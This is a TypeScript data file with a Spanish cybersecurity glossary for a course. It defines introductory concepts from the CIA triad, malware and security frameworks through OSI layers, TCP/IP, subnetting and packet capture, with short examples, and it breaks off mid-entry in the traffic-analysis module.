// Glosario de conceptos por módulo — da contenido real a cada tópico del syllabus
// (antes solo keywords sueltas). Datos puros, sin red. Piloto: Fundamentos M1-M4.
// `detail` admite el markdown enriquecido del renderer (negritas, tablas, callouts).

import type { ConceptDefinition } from "./types";

export const DEFINITIONS: ConceptDefinition[] = [
  // ── M1 · Fundamentos de Ciberseguridad ──────────────────────────────────
  {
    id: 1,
    module: 1,
    term: "Ciberseguridad",
    short: "Práctica de proteger sistemas, redes, datos y personas frente a ataques digitales.",
    detail:
      "La **ciberseguridad** no es solo tecnología: es la combinación de **tecnología, procesos y personas** para preservar la **confidencialidad, integridad y disponibilidad** (la tríada CIA) de la información.\n" +
      "> 💡 No existe la seguridad absoluta. El objetivo es **gestionar el riesgo** a un nivel aceptable, no eliminarlo por completo.\n" +
      "Se apoya en tres pilares prácticos:\n" +
      "• **Prevención** — reducir la probabilidad de que ocurra un incidente (hardening, parches, formación).\n" +
      "• **Detección** — descubrir lo que ya pasó o está pasando (logs, SIEM, EDR).\n" +
      "• **Respuesta** — contener, erradicar y recuperarse de un incidente.",
    examples: [
      "Un firewall que filtra tráfico malicioso entrante (prevención).",
      "Un SOC que detecta un inicio de sesión imposible desde otro país (detección).",
      "Restaurar desde backups tras un ransomware (respuesta y recuperación).",
    ],
    related: ["Gestión de riesgos", "Defensa en profundidad"],
  },
  {
    id: 2,
    module: 1,
    term: "Superficie de ataque",
    short: "Suma de todos los puntos por donde un atacante podría intentar entrar o extraer datos.",
    detail:
      "La **superficie de ataque** es el conjunto de todos los **vectores** expuestos: puertos abiertos, APIs, formularios web, empleados susceptibles a phishing, dependencias de software, dispositivos IoT, etc.\n" +
      "Se divide en tres dominios:\n" +
      "| Dominio | Ejemplos |\n" +
      "|---|---|\n" +
      "| Digital | Puertos, APIs, subdominios, credenciales filtradas |\n" +
      "| Física | Accesos, USB, equipos sin cifrar |\n" +
      "| Humana | Phishing, ingeniería social, insiders |\n" +
      "> ⚠️ Reducir la superficie de ataque (cerrar lo que no se usa) suele dar más seguridad que añadir defensas nuevas.",
    examples: [
      "Un servidor con RDP expuesto a Internet amplía la superficie digital.",
      "Un empleado que reutiliza contraseñas amplía la superficie humana.",
    ],
    related: ["Vector de ataque", "Hardening y CIS Benchmarks", "Principio de mínimo privilegio"],
  },
  {
    id: 3,
    module: 1,
    term: "Vector de ataque",
    short: "Camino o método concreto que usa un atacante para comprometer un objetivo.",
    detail:
      "Un **vector de ataque** es el *cómo*: el medio específico de entrada. Los más comunes hoy son el **phishing**, la **explotación de vulnerabilidades** sin parchear, las **credenciales robadas** y la **cadena de suministro** (software de terceros comprometido).",
    examples: [
      "Correo de phishing con un adjunto malicioso.",
      "Explotar una CVE en un servicio expuesto.",
      "Inyectar código en una dependencia npm (supply chain).",
    ],
    related: ["Superficie de ataque", "Anatomía de un phishing", "Exploit y Payload"],
  },
  {
    id: 4,
    module: 1,
    term: "Actor de amenaza",
    short: "Persona o grupo con la intención y capacidad de causar un daño digital.",
    detail:
      "Se clasifican por **motivación** y **capacidad**:\n" +
      "• **Script kiddies** — bajo nivel, usan herramientas ajenas.\n" +
      "• **Hacktivistas** — motivados ideológicamente.\n" +
      "• **Cibercriminales** — buscan dinero (ransomware, fraude).\n" +
      "• **APT (Amenazas Persistentes Avanzadas)** — patrocinadas por estados, sigilosas y bien financiadas.\n" +
      "• **Insiders** — amenaza interna, intencional o accidental.",
    examples: [
      "Un grupo de ransomware como LockBit (cibercrimen).",
      "APT29 / Cozy Bear (estado-nación).",
      "Un empleado descontento que filtra datos (insider).",
    ],
    related: ["TTP (Tácticas, Técnicas y Procedimientos)"],
  },
  {
    id: 5,
    module: 1,
    term: "Defensa en profundidad",
    short: "Estrategia de capas múltiples de seguridad para que ningún fallo único sea catastrófico.",
    detail:
      "La **defensa en profundidad** (*defense in depth*) asume que **cualquier control puede fallar**, así que se superponen capas: perímetro, red, host, aplicación, datos e identidad. Si una capa cae, las siguientes contienen el daño.\n" +
      "> 💡 Analogía: un castillo no confía solo en la muralla; tiene foso, muralla, torres, puertas y guardias.",
    examples: [
      "MFA + EDR + segmentación de red + backups cifrados, todo junto.",
      "Aunque caiga el firewall, el host sigue protegido por su EDR.",
    ],
    related: ["Principio de mínimo privilegio", "DMZ y segmentación de red", "Zero Trust Architecture"],
  },
  {
    id: 6,
    module: 1,
    term: "OSINT",
    short: "Inteligencia de fuentes abiertas: recopilar información pública sobre un objetivo.",
    detail:
      "**OSINT** (*Open Source Intelligence*) es la fase de **reconocimiento** que usa fuentes públicas: redes sociales, registros DNS/WHOIS, filtraciones, metadatos de documentos, Shodan, GitHub. Es la primera fase del Kill Chain y la base de un buen phishing dirigido.",
    examples: [
      "Buscar subdominios y correos de una empresa antes de un pentest.",
      "Encontrar credenciales filtradas en un volcado de datos público.",
    ],
    related: ["Reconocimiento pasivo vs activo", "Vector de ataque"],
  },

  // ── M2 · Tríada CIA y Principios ─────────────────────────────────────────
  {
    id: 20,
    module: 2,
    term: "Confidencialidad",
    short: "Garantizar que la información solo sea accesible para quien está autorizado.",
    detail:
      "La **confidencialidad** evita la divulgación no autorizada. Se logra con **cifrado** (en reposo y en tránsito), **control de acceso** y **clasificación de datos**. Su opuesto es una *brecha de datos*.",
    examples: [
      "Cifrar un disco con BitLocker/LUKS.",
      "TLS protegiendo el tráfico HTTPS.",
      "Permisos que impiden que un becario lea la nómina.",
    ],
    related: ["Cifrado simétrico"],
  },
  {
    id: 21,
    module: 2,
    term: "Integridad",
    short: "Garantizar que la información no se altere de forma no autorizada o accidental.",
    detail:
      "La **integridad** asegura que los datos son **exactos y completos**. Se verifica con **funciones hash** (SHA-256), **firmas digitales** y **checksums**. Una alteración no detectada rompe la integridad.",
    examples: [
      "Comparar el hash SHA-256 de una descarga con el publicado.",
      "Una firma digital que prueba que un documento no fue modificado.",
    ],
    related: ["Función hash", "No repudio"],
  },
  {
    id: 22,
    module: 2,
    term: "Disponibilidad",
    short: "Garantizar que los sistemas y datos estén accesibles cuando se necesiten.",
    detail:
      "La **disponibilidad** se mide en *uptime* (ej. 99,9%) y se protege con **redundancia**, **backups**, **balanceo de carga** y **mitigación de DDoS**. Un ataque de denegación de servicio ataca directamente este pilar.",
    examples: [
      "Réplicas y failover automático de una base de datos.",
      "Un CDN/anti-DDoS absorbiendo un ataque volumétrico.",
    ],
    related: ["Confidencialidad", "Integridad"],
  },
  {
    id: 23,
    module: 2,
    term: "AAA (Autenticación, Autorización, Accounting)",
    short: "El marco de control de acceso: quién eres, qué puedes hacer y qué hiciste.",
    detail:
      "| Pilar | Pregunta | Ejemplo |\n" +
      "|---|---|---|\n" +
      "| Autenticación | ¿Quién eres? | Contraseña + MFA |\n" +
      "| Autorización | ¿Qué puedes hacer? | Roles/permisos (RBAC) |\n" +
      "| Accounting | ¿Qué hiciste? | Logs de auditoría |\n" +
      "> 💡 Autenticar no es autorizar: identificarte no implica que tengas permiso para todo.",
    examples: [
      "Iniciar sesión con MFA (autenticación).",
      "Un rol 'editor' que puede publicar pero no borrar (autorización).",
      "Un log que registra quién accedió a qué y cuándo (accounting).",
    ],
    related: ["MFA y autenticación moderna", "Factores de autenticación", "Principio de mínimo privilegio", "Modelos de autorización"],
  },
  {
    id: 24,
    module: 2,
    term: "No repudio",
    short: "Imposibilidad de negar haber realizado una acción.",
    detail:
      "El **no repudio** garantiza que el autor de una acción no pueda negarla después. Se logra con **firmas digitales** y **logs de auditoría** robustos. Es clave en transacciones legales y financieras.",
    examples: [
      "Una firma digital que vincula un contrato a una persona.",
      "Logs inmutables que prueban quién aprobó un pago.",
    ],
    related: ["Integridad", "AAA (Autenticación, Autorización, Accounting)"],
  },
  {
    id: 25,
    module: 2,
    term: "Principio de mínimo privilegio",
    short: "Dar a cada usuario o proceso solo los permisos estrictamente necesarios.",
    detail:
      "El **mínimo privilegio** (*least privilege*) reduce el daño potencial de una cuenta comprometida: si un atacante roba una cuenta limitada, su alcance también es limitado. Complementa a **Zero Trust** ('nunca confíes, siempre verifica').",
    examples: [
      "Un servicio web que corre sin permisos de administrador.",
      "Acceso temporal *just-in-time* en vez de admin permanente.",
    ],
    related: ["Zero Trust Architecture", "Defensa en profundidad", "AAA (Autenticación, Autorización, Accounting)"],
  },

  // ── M3 · Amenazas, Ataques y Malware ─────────────────────────────────────
  {
    id: 40,
    module: 3,
    term: "Amenaza, Vulnerabilidad y Riesgo",
    short: "Tres conceptos que se confunden: el peligro, la debilidad y la probabilidad×impacto.",
    detail:
      "| Concepto | Definición | Ejemplo |\n" +
      "|---|---|---|\n" +
      "| Amenaza | Evento potencial que causa daño | Un grupo de ransomware |\n" +
      "| Vulnerabilidad | Debilidad explotable | Servidor sin parchear |\n" +
      "| Riesgo | Probabilidad × Impacto | Alta chance de cifrado de datos |\n" +
      "> 💡 **Riesgo = Amenaza × Vulnerabilidad × Impacto.** Sin vulnerabilidad explotable, una amenaza no se materializa.",
    examples: [
      "Amenaza: actor de ransomware. Vulnerabilidad: RDP expuesto. Riesgo: cifrado de toda la red.",
    ],
    related: ["CVE y CVSS", "CVE y CVSS", "Gestión de riesgos"],
  },
  {
    id: 41,
    module: 3,
    term: "Exploit y Payload",
    short: "El exploit abre la puerta (aprovecha la vulnerabilidad); el payload es lo que se ejecuta dentro.",
    detail:
      "Un **exploit** es el código o técnica que **aprovecha una vulnerabilidad** para lograr ejecución o acceso. El **payload** es la **acción posterior**: una reverse shell, un dropper de malware, exfiltración, etc.\n" +
      "> ⚠️ Una misma vulnerabilidad puede explotarse con muchos payloads distintos según el objetivo del atacante.",
    examples: [
      "Exploit: desbordamiento de búfer. Payload: reverse shell a la máquina del atacante.",
      "msfvenom genera payloads para un exploit de Metasploit.",
    ],
    related: ["Amenaza, Vulnerabilidad y Riesgo", "Zero-day"],
  },
  {
    id: 42,
    module: 3,
    term: "Zero-day",
    short: "Vulnerabilidad desconocida para el fabricante, sin parche disponible.",
    detail:
      "Un **zero-day** (día cero) es un fallo que **el proveedor aún no conoce ni ha corregido**, por lo que no hay parche. Son muy valiosos en el mercado negro y para APTs, porque las defensas basadas en firmas no los detectan.",
    examples: [
      "Log4Shell (2021) fue explotada masivamente antes de existir parche.",
      "Cadenas de zero-days usadas en spyware como Pegasus.",
    ],
    related: ["Exploit y Payload", "CVE y CVSS"],
  },
  {
    id: 43,
    module: 3,
    term: "CVE y CVSS",
    short: "CVE identifica una vulnerabilidad concreta; CVSS la puntúa de 0 a 10 por severidad.",
    detail:
      "**CVE** (*Common Vulnerabilities and Exposures*) es un **identificador único** (ej. `CVE-2021-44228`). **CVSS** (*Common Vulnerability Scoring System*) le asigna una **puntuación 0-10**:\n" +
      "| Rango CVSS | Severidad |\n" +
      "|---|---|\n" +
      "| 0.1 – 3.9 | Baja |\n" +
      "| 4.0 – 6.9 | Media |\n" +
      "| 7.0 – 8.9 | Alta |\n" +
      "| 9.0 – 10.0 | Crítica |\n" +
      "Se usan para **priorizar parches**: primero lo crítico y explotable.",
    examples: [
      "CVE-2021-44228 (Log4Shell) tuvo CVSS 10.0 (crítica).",
      "Priorizar el parcheo de una CVSS 9.8 sobre una 4.2.",
    ],
    related: ["Amenaza, Vulnerabilidad y Riesgo"],
  },
  {
    id: 44,
    module: 3,
    term: "IoC (Indicador de Compromiso)",
    short: "Evidencia forense de que un sistema fue (o está siendo) atacado.",
    detail:
      "Un **IoC** es una pista observable de actividad maliciosa: hashes de archivos, IPs/dominios de C2, claves de registro, nombres de procesos. Alimentan reglas de detección (SIEM, YARA, Sigma).\n" +
      "> 💡 Los IoC son la base **inferior** de la *Pyramid of Pain*: fáciles de cambiar para el atacante. Los **TTP** son lo más difícil de cambiar.",
    examples: [
      "Un hash SHA-256 de un binario de malware conocido.",
      "Una IP de comando y control (C2) en una lista de bloqueo.",
    ],
    related: ["TTP (Tácticas, Técnicas y Procedimientos)", "Reglas YARA", "Threat hunting"],
  },
  {
    id: 45,
    module: 3,
    term: "TTP (Tácticas, Técnicas y Procedimientos)",
    short: "El comportamiento de un atacante: qué busca, cómo lo hace y con qué pasos.",
    detail:
      "Las **TTP** describen el *modus operandi* de un adversario y son el lenguaje de **MITRE ATT&CK**:\n" +
      "• **Táctica** — el *objetivo* (ej. Acceso inicial, Persistencia).\n" +
      "• **Técnica** — el *cómo* (ej. Spear phishing).\n" +
      "• **Procedimiento** — la *implementación concreta* de ese grupo.\n" +
      "> 💡 Detectar por TTP es mucho más robusto que por IoC: el atacante puede cambiar una IP en segundos, pero cambiar su comportamiento le cuesta mucho más.",
    examples: [
      "Táctica: Persistencia → Técnica: Scheduled Task → Procedimiento: tarea creada por APT específica.",
    ],
    related: ["MITRE ATT&CK", "Indicadores de compromiso (IoC)", "Actor de amenaza"],
  },
  {
    id: 46,
    module: 3,
    term: "Ransomware",
    short: "Malware que cifra datos y exige un rescate, hoy a menudo con doble extorsión.",
    detail:
      "El **ransomware** cifra los archivos de la víctima y pide pago (cripto) por la clave. El modelo moderno usa **doble extorsión**: además de cifrar, **exfiltran** los datos y amenazan con publicarlos. Muchos operan como **RaaS** (*Ransomware as a Service*).",
    examples: [
      "WannaCry (2017) se propagó con el exploit EternalBlue.",
      "LockBit / BlackCat operando como RaaS con afiliados.",
    ],
    related: ["Clasificación de malware"],
  },

  // ── M4 · Frameworks y Estándares ─────────────────────────────────────────
  {
    id: 60,
    module: 4,
    term: "NIST Cybersecurity Framework (CSF)",
    short: "Marco voluntario que organiza la seguridad en funciones de alto nivel.",
    detail:
      "El **NIST CSF 2.0** estructura un programa de seguridad en **6 funciones**: **Govern, Identify, Protect, Detect, Respond, Recover**. Es agnóstico de tecnología y sirve para comunicar el estado de seguridad a la dirección.\n" +
      "> 💡 No es certificable (a diferencia de ISO 27001); es un marco de **buenas prácticas** y autoevaluación.",
    examples: [
      "Mapear los controles de la empresa a las 6 funciones del CSF.",
      "Usar el CSF para reportar madurez de seguridad al directorio.",
    ],
    related: ["ISO 27001, SGSI y SoA", "CIS Controls", "Gestión de riesgos"],
  },
  {
    id: 61,
    module: 4,
    term: "ISO/IEC 27001",
    short: "Norma internacional certificable para un Sistema de Gestión de Seguridad de la Información (SGSI).",
    detail:
      "**ISO 27001** define los requisitos de un **SGSI**: un sistema de gestión basado en el ciclo **PDCA** (Planificar-Hacer-Verificar-Actuar) y en la **gestión de riesgos**. Su **Anexo A** lista controles de referencia. A diferencia del NIST CSF, **es certificable** por un auditor acreditado.",
    examples: [
      "Una empresa SaaS que se certifica ISO 27001 para ganar clientes enterprise.",
      "Declaración de Aplicabilidad (SoA) justificando qué controles aplican.",
    ],
    related: ["Proceso de auditoría"],
  },
  {
    id: 62,
    module: 4,
    term: "CIS Controls",
    short: "Lista priorizada de 18 controles defensivos concretos y accionables.",
    detail:
      "Los **CIS Controls v8** son **18 controles** ordenados por impacto, agrupados en **Grupos de Implementación (IG1-IG3)** según el tamaño/riesgo de la organización. Son muy prácticos: dicen *qué hacer primero* (inventario de activos, gestión de vulnerabilidades, MFA, backups).",
    examples: [
      "IG1 como higiene básica para una PyME.",
      "Control 1 (inventario de activos) antes que defensas avanzadas.",
    ],
    related: ["Hardening y CIS Benchmarks"],
  },
  {
    id: 63,
    module: 4,
    term: "MITRE ATT&CK",
    short: "Base de conocimiento global de tácticas y técnicas reales de los adversarios.",
    detail:
      "**MITRE ATT&CK** es una **matriz** que cataloga las **TTP** observadas en ataques reales, organizadas por **tácticas** (columnas, el *porqué*) y **técnicas** (celdas, el *cómo*). Es el lenguaje común entre Red Team, Blue Team y Threat Intelligence para mapear detecciones y simular adversarios.",
    examples: [
      "Mapear las alertas del SOC a técnicas ATT&CK para medir cobertura.",
      "Un Red Team emulando las TTP de un grupo APT concreto.",
    ],
    related: ["TTP (Tácticas, Técnicas y Procedimientos)", "Threat hunting"],
  },
  {
    id: 64,
    module: 4,
    term: "Gestión de riesgos",
    short: "Proceso de identificar, evaluar y tratar los riesgos de seguridad de forma priorizada.",
    detail:
      "La **gestión de riesgos** decide *dónde invertir*. Tras evaluar cada riesgo (probabilidad × impacto), se elige una **estrategia de tratamiento**:\n" +
      "• **Mitigar** — reducirlo con controles.\n" +
      "• **Transferir** — ej. contratar un ciberseguro.\n" +
      "• **Aceptar** — asumirlo si es bajo o el control cuesta más que el daño.\n" +
      "• **Evitar** — eliminar la actividad que lo genera.",
    examples: [
      "Aceptar un riesgo bajo cuyo control sería más caro que el impacto.",
      "Transferir el riesgo de fraude con un seguro cibernético.",
    ],
    related: ["Gestión de riesgos", "ISO 27001, SGSI y SoA"],
  },

  // ── M5 · Redes: Modelo OSI ───────────────────────────────────────────────
  {
    id: 80,
    module: 5,
    term: "Modelo OSI",
    short: "Modelo de referencia que divide la comunicación de red en 7 capas independientes.",
    detail:
      "El **modelo OSI** (*Open Systems Interconnection*) estandariza cómo viajan los datos en **7 capas**, de abajo (física) hacia arriba (aplicación). Cada capa presta un servicio a la superior y se apoya en la inferior, de forma que un problema o ataque se puede aislar por capa.\n" +
      "> 💡 Mnemotecnia (de capa 1 a 7): **F**ísica · **E**nlace · **R**ed · **T**ransporte · **S**esión · **P**resentación · **A**plicación.",
    examples: [
      "Un cable y voltajes son capa 1 (física); una IP es capa 3 (red).",
      "Aislar un fallo: si hace ping (capa 3) pero no carga la web (capa 7), el problema es de capa superior.",
    ],
    related: ["Encapsulamiento y PDU", "Modelo TCP/IP", "Ataques por capa OSI"],
  },
  {
    id: 81,
    module: 5,
    term: "Encapsulamiento y PDU",
    short: "Proceso por el que cada capa envuelve los datos con su propia cabecera.",
    detail:
      "Al bajar por la pila, cada capa añade su **cabecera** (y a veces cola) a los datos: esto es el **encapsulamiento**. La unidad de datos resultante (**PDU**) cambia de nombre por capa:\n" +
      "| Capa | PDU | Direccionamiento |\n" +
      "|---|---|---|\n" +
      "| Aplicación (7) | Datos | — |\n" +
      "| Transporte (4) | Segmento (TCP) / Datagrama (UDP) | Puerto |\n" +
      "| Red (3) | Paquete | Dirección IP |\n" +
      "| Enlace (2) | Trama | Dirección MAC |\n" +
      "El receptor hace el proceso inverso (**desencapsulamiento**).",
    examples: [
      "Una petición HTTP se vuelve segmento TCP → paquete IP → trama Ethernet.",
      "El switch lee la trama (MAC); el router lee el paquete (IP).",
    ],
    related: ["Modelo OSI", "Dirección IPv4 vs IPv6", "TCP vs UDP"],
  },
  {
    id: 82,
    module: 5,
    term: "Ataques por capa OSI",
    short: "Cada capa tiene amenazas características; pensar por capa ayuda a defender.",
    detail:
      "Mapear ataques al modelo OSI orienta las defensas:\n" +
      "| Capa | Ataque típico | Defensa |\n" +
      "|---|---|---|\n" +
      "| 2 Enlace | ARP spoofing, MAC flooding | Dynamic ARP Inspection, port security |\n" +
      "| 3 Red | IP spoofing, DDoS | Filtrado, anti-DDoS |\n" +
      "| 4 Transporte | SYN flood, escaneo de puertos | SYN cookies, firewall |\n" +
      "| 7 Aplicación | SQLi, XSS, phishing | WAF, validación, formación |\n" +
      "> ⚠️ La mayoría de los ataques modernos golpean la **capa 7** (aplicación), la más expuesta.",
    examples: [
      "Un ARP spoofing (capa 2) permite un MITM en la red local.",
      "Un SYN flood (capa 4) agota la tabla de conexiones del servidor.",
    ],
    related: ["Modelo OSI"],
  },
  {
    id: 83,
    module: 5,
    term: "Capa de enlace vs capa de red",
    short: "La capa 2 mueve tramas en la red local (MAC); la capa 3 enruta paquetes entre redes (IP).",
    detail:
      "La **capa 2 (enlace)** entrega tramas dentro del **mismo segmento** usando **direcciones MAC** (físicas, del fabricante) y la maneja el **switch**. La **capa 3 (red)** lleva paquetes **entre redes distintas** usando **direcciones IP** (lógicas) y la maneja el **router**.",
    examples: [
      "Dos PCs del mismo WiFi se hablan por MAC (capa 2).",
      "Para salir a Internet, el router enruta por IP (capa 3).",
    ],
    related: ["Encapsulamiento y PDU", "Dirección IPv4 vs IPv6", "Modelo OSI"],
  },

  // ── M6 · TCP/IP y Protocolos ─────────────────────────────────────────────
  {
    id: 90,
    module: 6,
    term: "TCP vs UDP",
    short: "TCP es fiable y orientado a conexión; UDP es rápido y sin conexión.",
    detail:
      "Son los dos protocolos de **transporte** (capa 4). La elección es un trade-off **fiabilidad vs velocidad**:\n" +
      "| | TCP | UDP |\n" +
      "|---|---|---|\n" +
      "| Conexión | Sí (handshake) | No |\n" +
      "| Fiabilidad | Garantiza entrega y orden | Sin garantías |\n" +
      "| Velocidad | Mayor overhead | Más rápido y ligero |\n" +
      "| Usos | Web, SSH, correo | DNS, VoIP, streaming, juegos |",
    examples: [
      "Descargar un archivo usa TCP (no puede faltar un byte).",
      "Una videollamada usa UDP (mejor perder un frame que esperar).",
    ],
    related: ["Three-way handshake", "Puertos y sockets", "DNS"],
  },
  {
    id: 91,
    module: 6,
    term: "Three-way handshake",
    short: "El saludo de 3 pasos con que TCP establece una conexión: SYN, SYN-ACK, ACK.",
    detail:
      "Antes de enviar datos, TCP sincroniza ambos extremos en **3 pasos**:\n" +
      "• **SYN** — el cliente propone conexión y un número de secuencia inicial.\n" +
      "• **SYN-ACK** — el servidor acepta y responde con el suyo.\n" +
      "• **ACK** — el cliente confirma; la conexión queda establecida.\n" +
      "> ⚠️ Un **SYN flood** abusa de este proceso: envía miles de SYN sin completar el ACK para agotar los recursos del servidor.",
    examples: [
      "Cada conexión HTTPS empieza con un three-way handshake.",
      "nmap puede dejar handshakes a medias (SYN scan) para escanear con sigilo.",
    ],
    related: ["TCP vs UDP", "Puertos y sockets", "Ataques por capa OSI"],
  },
  {
    id: 92,
    module: 6,
    term: "Puertos y sockets",
    short: "El puerto identifica un servicio dentro de un host; IP + puerto forman un socket.",
    detail:
      "Un **puerto** (0-65535) indica a qué **servicio** va el tráfico dentro de una máquina. La combinación **IP:puerto** es un **socket**. Se agrupan en:\n" +
      "| Rango | Tipo | Ejemplos |\n" +
      "|---|---|---|\n" +
      "| 0-1023 | Bien conocidos | 80 HTTP, 443 HTTPS, 22 SSH, 53 DNS |\n" +
      "| 1024-49151 | Registrados | 3306 MySQL, 3389 RDP |\n" +
      "| 49152-65535 | Dinámicos | puertos efímeros del cliente |\n" +
      "> 💡 Conocer los **puertos esenciales** acelera el reconocimiento y el triage de un escaneo.",
    examples: [
      "192.168.1.10:443 es el socket de un servidor web HTTPS.",
      "Ver el puerto 3389 abierto sugiere RDP expuesto (riesgo).",
    ],
    related: ["TCP vs UDP", "DNS", "Three-way handshake"],
  },
  {
    id: 93,
    module: 6,
    term: "DNS",
    short: "La 'agenda de Internet': traduce nombres de dominio a direcciones IP.",
    detail:
      "El **DNS** (*Domain Name System*) resuelve `alphalog.io` → `IP`. La resolución es jerárquica: **resolver → raíz → TLD (.io) → servidor autoritativo**, con caché en cada paso. Suele ir sobre **UDP/53** (TCP para respuestas grandes).\n" +
      "> ⚠️ Vectores comunes: **DNS spoofing/cache poisoning** (respuestas falsas), **DNS tunneling** (exfiltrar datos) y **DDoS de amplificación**. Mitigaciones: **DNSSEC**, **DoH/DoT**.",
    examples: [
      "Escribir una web dispara una consulta DNS antes del handshake TCP.",
      "Malware usando DNS tunneling para sacar datos evitando el firewall.",
    ],
    related: ["Puertos y sockets", "TCP vs UDP", "Vector de ataque"],
  },
  {
    id: 94,
    module: 6,
    term: "Modelo TCP/IP",
    short: "El modelo práctico de Internet: 4 capas que condensan las 7 del OSI.",
    detail:
      "El **modelo TCP/IP** es el que realmente usa Internet. Sus **4 capas** mapean al OSI:\n" +
      "| TCP/IP | OSI equivalente | Ejemplos |\n" +
      "|---|---|---|\n" +
      "| Aplicación | 5-6-7 | HTTP, DNS, SSH |\n" +
      "| Transporte | 4 | TCP, UDP |\n" +
      "| Internet | 3 | IP, ICMP |\n" +
      "| Acceso a red | 1-2 | Ethernet, WiFi |",
    examples: [
      "El OSI es teórico/didáctico; el TCP/IP es el operativo.",
      "HTTPS = capa aplicación sobre TCP (transporte) sobre IP (internet).",
    ],
    related: ["Modelo OSI", "TCP vs UDP", "DNS"],
  },

  // ── M7 · Direccionamiento IP y Subnetting ────────────────────────────────
  {
    id: 100,
    module: 7,
    term: "Dirección IPv4 vs IPv6",
    short: "IPv4 usa 32 bits (~4.300 millones); IPv6 usa 128 bits (prácticamente infinitas).",
    detail:
      "Una **dirección IP** identifica un host en la red. **IPv4** son 32 bits en 4 octetos decimales (`192.168.1.1`); su agotamiento motivó **IPv6**, de 128 bits en hexadecimal (`2001:db8::1`). IPv6 elimina la necesidad de NAT por su enorme espacio.",
    examples: [
      "IPv4: 192.168.1.20 — IPv6: fe80::1ff:fe23:4567:890a.",
      "IPv4 se agotó; los ISP migran gradualmente a IPv6.",
    ],
    related: ["IP privada vs pública", "Subnetting y CIDR", "NAT y PAT"],
  },
  {
    id: 101,
    module: 7,
    term: "IP privada vs pública",
    short: "Las privadas viven dentro de la LAN; las públicas son enrutables en Internet.",
    detail:
      "Las **IP privadas** (RFC 1918) no se enrutan en Internet y se reutilizan en cada red local; las **públicas** son únicas y visibles. El **NAT** traduce entre ambas.\n" +
      "| Rango privado | Tamaño |\n" +
      "|---|---|\n" +
      "| 10.0.0.0/8 | ~16,7 M |\n" +
      "| 172.16.0.0/12 | ~1 M |\n" +
      "| 192.168.0.0/16 | ~65 K |",
    examples: [
      "Tu PC en casa: privada 192.168.1.x; tu router muestra una pública al ISP.",
      "Muchos hosts privados comparten una IP pública vía NAT.",
    ],
    related: ["NAT y PAT", "Dirección IPv4 vs IPv6"],
  },
  {
    id: 102,
    module: 7,
    term: "Subnetting y CIDR",
    short: "Dividir una red en subredes más pequeñas; CIDR expresa la máscara como /N.",
    detail:
      "El **subnetting** parte una red en **subredes** para mejorar organización, rendimiento y **seguridad** (aislar segmentos). **CIDR** (`/24`) indica cuántos bits son de red: `/24` = máscara `255.255.255.0` = 256 direcciones (254 usables).\n" +
      "> 💡 Cuanto **mayor** el número tras la `/`, **más pequeña** la subred (más bits de red, menos de host).",
    examples: [
      "192.168.1.0/24 → 254 hosts usables.",
      "Separar servidores y usuarios en subredes distintas reduce el movimiento lateral.",
    ],
    related: ["DMZ y segmentación de red", "IP privada vs pública", "NAT y PAT"],
  },
  {
    id: 103,
    module: 7,
    term: "NAT y PAT",
    short: "Traducen direcciones privadas a públicas; PAT multiplexa muchas IP en una usando puertos.",
    detail:
      "El **NAT** (*Network Address Translation*) reescribe la IP privada de origen por una pública al salir a Internet. El **PAT** (NAT *overload*) permite que **muchos hosts compartan una sola IP pública** distinguiéndolos por **puerto**. Es lo que usa cualquier router doméstico.",
    examples: [
      "10 dispositivos de casa navegan con una única IP pública (PAT).",
      "El NAT también oculta la topología interna (beneficio colateral de seguridad).",
    ],
    related: ["IP privada vs pública", "Puertos y sockets"],
  },
  {
    id: 104,
    module: 7,
    term: "DMZ y segmentación de red",
    short: "Aislar zonas de la red para que un compromiso no se propague a todo.",
    detail:
      "La **segmentación** divide la red en zonas con controles entre ellas. Una **DMZ** (*zona desmilitarizada*) es una subred intermedia donde se ubican los servicios **expuestos a Internet** (web, correo), separados de la red interna por firewalls.\n" +
      "> 💡 Si comprometen el servidor web de la DMZ, **no** tiene línea directa a la red interna sensible.",
    examples: [
      "Servidor web público en la DMZ; base de datos en la red interna.",
      "Microsegmentación + Zero Trust para limitar el movimiento lateral.",
    ],
    related: ["Subnetting y CIDR", "Defensa en profundidad", "Principio de mínimo privilegio"],
  },

  // ── M8 · Análisis de Tráfico (Wireshark) ─────────────────────────────────
  {
    id: 110,
    module: 8,
    term: "Captura de paquetes y PCAP",
    short: "Interceptar y guardar el tráfico de red para inspeccionarlo paquete a paquete.",
    detail:
      "Capturar tráfico (*packet sniffing*) registra los paquetes que pasan por una interfaz en **modo promiscuo**. El formato estándar de guardado es **PCAP** (`.pcap`/`.pcapng`), que herramientas como **Wireshark** abren para análisis e investigación forense.",
    examples: [
      "Guardar un .pcap durante un incidente para analizarlo después.",
      "Reproducir una sesión sospechosa desde una captura.",
    ],
    related: ["Filtros de captura vs display", "tcpdump y tshark", "Detección de anomalías en tráfico"],
  },
  {
    id: 111,
    module: 8,
    term: "Filtros de captura vs display",
    short: "Los de captura deciden qué se graba; los de display, qué se muestra de lo grabado.",
    detail:
      "Wireshark distingue dos filtros con **sintaxis diferente**:\n" +
      "| Tipo | Cuándo actúa | Sintaxis | Ejemplo |\n" +
      "|---|---|---|---|\n" +
      "| Captura | Antes de grabar | BPF | `tcp port 80` |\n" +
      "| Display | Sobre lo ya grabado | Wireshark | `http.request.method == \"POST\"` |\n" +
      "> 💡 Filtra en **captura** para reducir volumen; filtra en **display** para investigar sin perder datos.",
    examples: [
      "Captura: `host 10.0.0.5` para grabar solo a ese equipo.",
      "Display: `ip.addr == 10.0.0.5 && dns` para ver su DNS.",
    ],
    related: ["Captura de paquetes y PCAP", "tcpdump y tshark", "Puertos y sockets"],
  },
  {
    id: 112,
    module: 8,
    term: "tcpdump y tshark",
    short: "Las versiones de línea de comandos para capturar y analizar tráfico sin interfaz gráfica.",
    detail:
      "Cuando no hay GUI (servidores, SSH), se usan herramientas CLI: **tcpdump** (clásica, sintaxis BPF) y **tshark** (el Wireshark de terminal). Son ideales para **capturar en remoto** y guardar un `.pcap` que luego se abre en Wireshark.",
    examples: [
      "`tcpdump -i eth0 -w captura.pcap` graba la interfaz a un archivo.",
      "`tshark -r captura.pcap -Y http` filtra HTTP de una captura.",
    ],
    related: ["Captura de paquetes y PCAP", "Filtros de captura vs display"],
  },
  {
    id: 113,
    module: 8,
    term: "Detección de anomalías en tráfico",
    short: "Reconocer patrones de ataque o exfiltración dentro del tráfico capturado.",
    detail:
      "El análisis de tráfico revela actividad maliciosa por sus **patrones**:\n" +
      "• **Escaneo de puertos** — muchos SYN a puertos distintos desde un origen.\n" +
      "• **Exfiltración** — transferencias grandes o regulares hacia una IP externa.\n" +
